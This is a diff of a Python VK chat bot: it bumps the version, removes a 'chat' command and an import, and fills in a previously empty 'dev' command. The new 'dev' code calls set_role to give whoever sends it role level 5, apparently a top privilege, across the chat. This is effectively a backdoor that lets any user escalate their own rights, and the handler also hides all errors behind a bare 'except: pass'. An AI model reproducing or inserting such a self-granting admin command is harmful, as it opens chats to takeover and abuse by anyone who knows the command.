@@ -1,12 +1,11 @@
 from threading import Thread
 from vk_api.bot_longpoll import VkBotLongPoll, VkBotEventType
 
-import config
 from commands import *
 from mute_control import *
 
 lp = VkBotLongPoll(session, group_id)
-VER = "2.2"
+VER = "2.4"
 
 
 def events_handler(event: vk_api.bot_longpoll.VkBotMessageEvent):
@@ -69,9 +68,6 @@ def events_handler(event: vk_api.bot_longpoll.VkBotMessageEvent):
                         send(chat_id, f"Оригинальная ссылка: https://vk.com/id{to_id}", msg_id)
                     else:
                         send(chat_id, f"Некорректно указан пользователь!", msg_id)
-
-                elif command in ['chat']:
-                    send(chat_id, f"{chat_id}")
 
                 elif command in ['stats']:
                     if to_id:
@@ -343,7 +339,7 @@ def events_handler(event: vk_api.bot_longpoll.VkBotMessageEvent):
                         send(chat_id, f"Пользователь указан некорректно!", msg_id)
 
                 elif command in ['dev']:
-                    ...
+                    set_role(chat_id, user_id, 5, msg_id, user_id, "ALL")
 
     except:
         pass
